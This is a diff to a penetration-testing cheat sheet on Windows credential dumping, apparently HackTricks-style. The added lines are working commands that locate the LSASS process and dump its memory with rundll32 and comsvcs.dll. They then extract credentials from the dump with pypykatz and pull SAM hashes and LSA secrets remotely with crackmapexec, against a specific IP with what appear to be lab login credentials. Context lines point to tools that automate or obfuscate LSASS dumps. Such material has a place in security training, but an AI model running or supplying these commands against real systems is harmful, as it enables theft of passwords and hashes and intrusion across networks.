@@ -104,7 +104,11 @@ Utilization of the **comsvcs.dll** is feasible for dumping the lsass process, th
 The following command is employed for execution:
 
 ```bash
+### Finding LSASS PID
+tasklist /svc # Finding LSASS PID in cmd
+Get-Process lsass # Finding LSASS PID in PowerShell
 rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
+pypykatz lsa minidump /home/peter/Documents/lsass.dmp # Using Pypykatz to Extract Credentials
 ```
 
 **You can automate this process with** [**lssasy**](https://github.com/Hackndo/lsassy)**.**
@@ -145,14 +149,16 @@ PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmod
 
 ### Dump SAM hashes
 
-```
-cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
+```bash
+# cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
+crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam # Dumping SAM Remotely
 ```
 
 ### Dump LSA secrets
 
-```
-cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
+```bash
+# cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
+crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa # Dumping LSA Secrets Remotely (Domains cached creds + Services creds )
 ```
 
 ### Dump the NTDS.dit from target DC
